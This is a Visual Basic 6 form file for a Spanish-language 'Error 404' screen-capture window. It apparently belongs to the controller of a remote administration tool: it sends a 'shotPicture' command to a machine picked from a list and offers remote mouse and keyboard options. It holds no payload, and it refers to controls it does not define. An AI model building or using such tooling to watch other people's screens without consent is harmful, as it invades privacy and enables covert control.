VERSION 5.00
Begin VB.Form frmScreenShot 
   BackColor       =   &H00FFFFFF&
   Caption         =   "Error 404 - Captura de Pantalla"
   ClientHeight    =   3375
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   5055
   Icon            =   "frmScreenShot.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3375
   ScaleWidth      =   5055
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox PictureShot 
      Height          =   3135
      Left            =   1320
      ScaleHeight     =   3075
      ScaleWidth      =   3675
      TabIndex        =   8
      Top             =   0
      Width           =   3735
      Begin VB.Timer tmrGeneral 
         Interval        =   1
         Left            =   0
         Top             =   0
      End
   End
   Begin VB.Frame fraScreen 
      BorderStyle     =   0  'None
      Height          =   255
      Index           =   1
      Left            =   0
      TabIndex        =   12
      Top             =   3120
      Width           =   5055
   End
   Begin VB.Frame fraScreen 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Height          =   3135
      Index           =   0
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   1215
      Begin VB.CheckBox chkKeyboard 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Teclado"
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   2760
         Width           =   855
      End
      Begin VB.CheckBox chkMouse 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Raton"
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   2400
         Width           =   735
      End
      Begin VB.CommandButton cmdSave 
         Caption         =   "Guardar"
         Enabled         =   0   'False
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   1960
         Width           =   975
      End
      Begin VB.TextBox txtQuality 
         Height          =   285
         Left            =   720
         MaxLength       =   3
         TabIndex        =   6
         Text            =   "100"
         Top             =   1320
         Width           =   375
      End
      Begin VB.TextBox txtInterval 
         ForeColor       =   &H00000000&
         Height          =   285
         Left            =   840
         MaxLength       =   1
         TabIndex        =   4
         Text            =   "0"
         Top             =   960
         Width           =   255
      End
      Begin VB.CommandButton cmdVideo 
         Caption         =   "Video On/"
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   480
         Width           =   1095
      End
      Begin VB.CommandButton cmdPicture 
         Caption         =   "Imagen"
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   120
         Width           =   1095
      End
      Begin VB.Line Line1 
         BorderColor     =   &H80000011&
         DrawMode        =   7  'Invert
         X1              =   120
         X2              =   1080
         Y1              =   2280
         Y2              =   2280
      End
      Begin VB.Label lblSize 
         Alignment       =   1  'Right Justify
         BackColor       =   &H00FFFFFF&
         Height          =   195
         Left            =   120
         TabIndex        =   7
         Top             =   1680
         Width           =   960
      End
      Begin VB.Label lblScreen 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Calidad"
         Height          =   195
         Index           =   1
         Left            =   120
         TabIndex        =   5
         Top             =   1320
         Width           =   525
      End
      Begin VB.Label lblScreen 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H80000000&
         BackStyle       =   0  'Transparent
         Caption         =   "Intervalo"
         Height          =   195
         Index           =   0
         Left            =   120
         TabIndex        =   3
         Top             =   960
         Width           =   645
      End
   End
End
Attribute VB_Name = "frmScreenShot"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'Height = 3795
'Width = 5145
Dim Act As Byte

Private Sub cmdPicture_Click()
cmdSave.Enabled = True
Send "shotPicture|" & PictureShot.Height & "|" & PictureShot.Width
End Sub

Private Sub tmrGeneral_Timer()
If Me.Height < 3795 Then Exit Sub
If Me.Width < 5145 Then Exit Sub
  PictureShot.Height = Me.Height - 820
  PictureShot.Width = Me.Width - 1560
  fraScreen(1).Width = Me.Width
  fraScreen(1).Top = SB.Top
  PB.Width = fraScreen(1).Width
End Sub

Private Sub cmdVideo_Click()
Dim pbv As Long
cmdSave.Enabled = True
    If Act = 0 Then
        cmdVideo.Caption = "Video /Off"
        cmdPicture.Enabled = False
        txtInterval.ForeColor = &H80000011
        txtQuality.ForeColor = &H80000011
        chkMouse.Enabled = True
        chkKeyboard.Enabled = True
        Act = 1
      GoTo CODE
    ElseIf Act = 1 Then
        cmdVideo.Caption = "Video On/"
        cmdPicture.Enabled = True
        txtInterval.ForeColor = &H80000012
        txtQuality.ForeColor = &H80000012
        chkMouse.Enabled = False
        chkKeyboard.Enabled = False
        Act = 0
      Exit Sub
    End If
CODE:
For pbv = PB.Min To PB.Max
PB.value = pbv
Next pbv
End Sub

Private Sub Form_Load()
Me.Caption = "Error 404 - Captura de Pantalla [" & frmMain.LV.SelectedItem & "]"
End Sub

Sub Shot(Picture As String)
PictureShot.Picture = Picture
End Sub
